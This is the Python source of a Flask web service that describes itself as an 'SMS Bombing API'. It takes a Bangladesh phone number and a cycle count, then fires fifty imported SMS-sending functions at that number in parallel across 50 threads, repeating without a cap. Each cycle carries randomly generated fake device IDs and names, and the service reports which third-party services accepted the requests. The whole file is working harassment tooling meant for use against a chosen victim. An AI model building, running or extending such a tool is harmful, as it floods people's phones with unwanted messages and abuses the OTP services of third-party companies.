import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify
from flask_cors import CORS

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)

# List of all API functions
API_FUNCTIONS = [
    api_1, api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_10,
    api_11, api_12, api_13, api_14, api_15, api_16, api_17, api_18, api_19,
    api_20, api_21, api_22, api_23, api_24, api_25, api_26, api_27, api_28,
    api_29, api_30, api_31, api_32, api_33, api_34, api_35, api_36, api_37,
    api_38, api_39, api_40, api_41, api_42, api_43, api_44, api_45, api_46,
    api_47, api_48, api_49, api_50
]

def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with proper parameters"""
    try:
        # Handle APIs with different parameter requirements
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        if result and hasattr(result, 'status_code'):
            return {"success": result.status_code == 200, "status_code": result.status_code}
        return {"success": False, "status_code": "N/A"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def execute_bombing(number, req_count):
    """Execute bombing requests with detailed statistics"""
    all_results = []
    successful_apis = []
    failed_apis = []
    total_api_calls = 0
    successful_calls = 0
    
    for cycle in range(req_count):
        # Generate random strings for each cycle
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_results = []
        cycle_success = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for api_func in API_FUNCTIONS:
                future = executor.submit(call_single_api, api_func, number, pgen, egen, did, None, name)
                futures.append((api_func.__name__, future))
            
            for api_name, future in futures:
                result = future.result()
                total_api_calls += 1
                if result.get("success"):
                    successful_calls += 1
                    cycle_success += 1
                    successful_apis.append(api_name)
                    cycle_results.append({"api": api_name, "status": "success", "code": result.get("status_code")})
                else:
                    failed_apis.append(api_name)
                    cycle_results.append({
                        "api": api_name, 
                        "status": "failed", 
                        "code": result.get("status_code", "N/A"),
                        "error": result.get("error", "Unknown error")
                    })
        
        all_results.append({
            "cycle": cycle + 1,
            "successful": cycle_success,
            "failed": len(API_FUNCTIONS) - cycle_success,
            "details": cycle_results
        })
        
        # Add delay between cycles (except after last cycle)
        if cycle < req_count - 1:
            time.sleep(2)  # Reduced delay for faster response
    
    # Calculate success rate
    success_rate = (successful_calls / total_api_calls * 100) if total_api_calls > 0 else 0
    
    return {
        "status": "completed",
        "target_number": number,
        "total_cycles": req_count,
        "total_api_calls": total_api_calls,
        "successful_calls": successful_calls,
        "failed_calls": total_api_calls - successful_calls,
        "success_rate": round(success_rate, 2),
        "unique_successful_apis": list(set(successful_apis)),
        "unique_failed_apis": list(set(failed_apis)),
        "cycles_detail": all_results
    }

@app.route('/')
def home():
    return jsonify({
        "service": "SMS Bombing API",
        "status": "active",
        "endpoints": {
            "GET /api/send": "Send SMS bombs to a number",
            "GET /api/health": "Check API health status"
        },
        "usage": "/api/send?number=017xxxxxxxx&req=5",
        "parameters": {
            "number": "Bangladesh phone number (without +88)",
            "req": "Number of request cycles (1-100, default: 1)"
        },
        "response_fields": {
            "status": "Operation status",
            "target_number": "Target phone number",
            "total_cycles": "Number of request cycles executed",
            "total_api_calls": "Total individual API calls made",
            "successful_calls": "Number of successful API calls",
            "failed_calls": "Number of failed API calls",
            "success_rate": "Success percentage",
            "unique_successful_apis": "List of APIs that worked",
            "unique_failed_apis": "List of APIs that failed"
        }
    })

@app.route('/api/health')
def health_check():
    return jsonify({
        "status": "healthy",
        "api_count": len(API_FUNCTIONS),
        "timestamp": time.time()
    })

@app.route('/api/send')
def send_bomb():
    """Main API endpoint - GET request only"""
    # Get parameters
    number = request.args.get('number')
    req_count = request.args.get('req', 1)
    
    # Validate number
    if not number:
        return jsonify({
            "error": "Missing parameter",
            "message": "Please provide 'number' parameter",
            "example": "/api/send?number=017xxxxxxxx&req=5"
        }), 400
    
    # Validate number format (Bangladesh numbers)
    number = str(number).strip()
    if not number.isdigit() or len(number) < 11 or len(number) > 11:
        return jsonify({
            "error": "Invalid number format",
            "message": "Please provide a valid 11-digit Bangladesh number (e.g., 01712345678)"
        }), 400
    
    # Validate request count
    try:
        req_count = int(req_count)
    except ValueError:
        return jsonify({
            "error": "Invalid parameter",
            "message": "'req' must be an integer"
        }), 400
    
    # No limit - allow any number of requests
    if req_count < 1:
        req_count = 1
    
    try:
        # Execute bombing
        result = execute_bombing(number, req_count)
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({
            "error": "Execution failed",
            "message": str(e)
        }), 500

@app.route('/api/info')
def api_info():
    """Get information about available APIs"""
    api_names = [func.__name__ for func in API_FUNCTIONS]
    return jsonify({
        "total_apis": len(API_FUNCTIONS),
        "api_list": api_names,
        "description": "Each cycle sends requests through all available SMS APIs"
    })

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found", "message": "Use /api/send to send requests"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error", "message": "Please try again later"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
